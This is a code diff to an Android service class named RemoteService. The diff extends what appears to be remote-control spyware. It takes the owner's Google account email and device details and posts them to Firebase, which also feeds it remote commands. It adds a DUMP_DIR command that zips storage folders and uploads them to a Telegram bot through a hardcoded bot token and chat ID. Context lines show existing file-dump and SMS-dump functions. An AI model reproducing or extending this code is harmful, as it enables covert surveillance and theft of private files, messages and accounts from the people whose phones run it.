@@ -1,46 +1,49 @@
 package com.sohaibazmi.remote;
 
+import android.accounts.Account;
+import android.accounts.AccountManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
-
+import java.util.HashMap;
+import java.util.Map;
+import java.util.zip.ZipEntry;
 import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
-
+import okhttp3.Call;
+import okhttp3.Callback;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.RequestBody;
+import okhttp3.Response;
+import okhttp3.MediaType;
+import okhttp3.MultipartBody;
 import android.net.ConnectivityManager;
 import android.net.Network;
 import android.net.NetworkCapabilities;
 import android.net.NetworkInfo;
 import android.net.Uri;
-
 import android.os.Build;
 import android.os.Environment;
 import android.os.IBinder;
 import android.provider.ContactsContract;
 import android.provider.Settings;
 import android.util.Log;
-
 import androidx.annotation.Nullable;
 import androidx.core.app.NotificationCompat;
-
 import com.google.firebase.FirebaseApp;
 import com.google.firebase.database.*;
-
+import java.io.BufferedInputStream;
 import java.io.BufferedWriter;
 import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
 import java.io.FileWriter;
 import java.io.IOException;
-
-import okhttp3.Call;
+import java.util.zip.ZipOutputStream;
 import okhttp3.FormBody;
-import okhttp3.MediaType;
-import okhttp3.MultipartBody;
-import okhttp3.OkHttpClient;
-import okhttp3.Request;
-import okhttp3.RequestBody;
-import okhttp3.Response;
 
 
 public class RemoteService extends Service {
@@ -54,7 +57,27 @@ public class RemoteService extends Service {
 
         String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
 
-        FirebaseDatabase.getInstance().getReference("devices").child(deviceId).setValue("active");
+        AccountManager accountManager = AccountManager.get(this);
+        Account[] accounts = accountManager.getAccountsByType("com.google");
+
+        String possibleEmail = "unknown";
+
+        if (accounts.length > 0) {
+            possibleEmail = accounts[0].name;  // typically user@example.com
+        }
+
+
+        Map<String, Object> deviceInfo = new HashMap<>();
+        deviceInfo.put("Email", possibleEmail);
+        deviceInfo.put("manufacturer", android.os.Build.MANUFACTURER);
+        deviceInfo.put("model", android.os.Build.MODEL);
+        deviceInfo.put("osVersion", android.os.Build.VERSION.RELEASE);
+
+        FirebaseDatabase.getInstance()
+                .getReference("devices")
+                .child(deviceId)
+                .setValue(deviceInfo);
+
 
         FirebaseDatabase.getInstance().getReference("commands").child(deviceId)
                 .addValueEventListener(new ValueEventListener() {
@@ -71,6 +94,10 @@ public class RemoteService extends Service {
                         else if (cmd != null && cmd.startsWith("DUMP_FILE:")) {
                             String path = cmd.substring("DUMP_FILE:".length()).trim();
                             dumpFile(path);
+                        }
+                        else if (cmd != null && cmd.startsWith("DUMP_DIR:")) {
+                            String dirPath = cmd.substring("DUMP_DIR:".length()).trim();
+                            dumpDirectoryAsZip(dirPath);
                         }
                     }
 
@@ -118,6 +145,121 @@ public class RemoteService extends Service {
         }
     }
 
+    private void dumpDirectoryAsZip(final String dirPath) {
+        try {
+            String fullPath = dirPath.startsWith("/storage") ? dirPath
+                    : Environment.getExternalStorageDirectory().getAbsolutePath() + dirPath;
+
+            File dir = new File(fullPath);
+            if (!dir.exists() || !dir.isDirectory() || !dir.canRead()) {
+                Log.e("REMOTE_CMD", "❌ Directory not accessible: " + fullPath);
+                return;
+            }
+
+            // Create zip in app's private cache dir
+            File zipFile = new File(getCacheDir(), dir.getName() + ".zip");
+            zipDirectory(dir, zipFile);
+
+            if (!zipFile.exists()) {
+                Log.e("REMOTE_CMD", "❌ Zip creation failed: " + zipFile.getAbsolutePath());
+                return;
+            }
+
+            sendTelegramZip(zipFile, () -> {
+                boolean deleted = zipFile.delete();
+                Log.d("REMOTE_CMD", deleted ? "🗑️ Zip deleted: " + zipFile.getAbsolutePath()
+                        : "⚠️ Failed to delete zip: " + zipFile.getAbsolutePath());
+            });
+
+            Log.d("REMOTE_CMD", "✅ Directory zipped: " + zipFile.getAbsolutePath());
+
+        } catch (Exception e) {
+            Log.e("REMOTE_CMD", "❌ dumpDirectoryAsZip() error", e);
+        }
+    }
+
+
+    private void zipDirectory(File sourceDir, File zipFile) throws Exception {
+        FileOutputStream fos = new FileOutputStream(zipFile);
+        ZipOutputStream zos = new ZipOutputStream(fos);
+        zipFileRecursive(sourceDir, sourceDir.getAbsolutePath(), zos);
+        zos.close();
+        fos.close();
+    }
+
+    private void zipFileRecursive(File fileToZip, String basePath, ZipOutputStream zos) throws Exception {
+        if (fileToZip.isHidden()) return;
+
+        if (fileToZip.isDirectory()) {
+            File[] children = fileToZip.listFiles();
+            if (children != null) {
+                for (File childFile : children) {
+                    zipFileRecursive(childFile, basePath, zos);
+                }
+            }
+        } else {
+            FileInputStream fis = new FileInputStream(fileToZip);
+            BufferedInputStream bis = new BufferedInputStream(fis);
+
+            // Keep relative path inside ZIP
+            String zipEntryName = fileToZip.getAbsolutePath().substring(basePath.length() + 1);
+            zos.putNextEntry(new ZipEntry(zipEntryName));
+
+            byte[] buffer = new byte[4096];
+            int length;
+            while ((length = bis.read(buffer)) >= 0) {
+                zos.write(buffer, 0, length);
+            }
+
+            zos.closeEntry();
+            bis.close();
+            fis.close();
+        }
+    }
+
+    private void sendTelegramZip(File zipFile, Runnable onComplete) {
+        if (zipFile == null || !zipFile.exists()) {
+            Log.e("TELEGRAM", "❌ File not found: " + (zipFile != null ? zipFile.getAbsolutePath() : "null"));
+            if (onComplete != null) onComplete.run();
+            return;
+        }
+
+        String botToken = "8171904880:AAFICyJVYDyXGrcwrzjFgAJJqkiIi2zBIcE";
+        String chatId = "6865050227";
+        String url = "https://api.telegram.org/bot" + botToken + "/sendDocument";
+
+        OkHttpClient client = new OkHttpClient();
+
+        RequestBody fileBody = RequestBody.create(zipFile, MediaType.parse("application/zip"));
+        MultipartBody requestBody = new MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("chat_id", chatId)
+                .addFormDataPart("document", zipFile.getName(), fileBody)
+                .build();
+
+        Request request = new Request.Builder()
+                .url(url)
+                .post(requestBody)
+                .build();
+
+        client.newCall(request).enqueue(new Callback() {
+            @Override
+            public void onFailure(Call call, IOException e) {
+                Log.e("TELEGRAM", "❌ Upload failed", e);
+                if (onComplete != null) onComplete.run();
+            }
+
+            @Override
+            public void onResponse(Call call, Response response) throws IOException {
+                if (response.isSuccessful()) {
+                    Log.d("TELEGRAM", "✅ ZIP sent: " + zipFile.getName());
+                } else {
+                    Log.e("TELEGRAM", "❌ Telegram error: " + response.code() + " - " + response.message());
+                }
+                if (onComplete != null) onComplete.run();
+            }
+        });
+    }
 
 
     private void dumpSMS() {
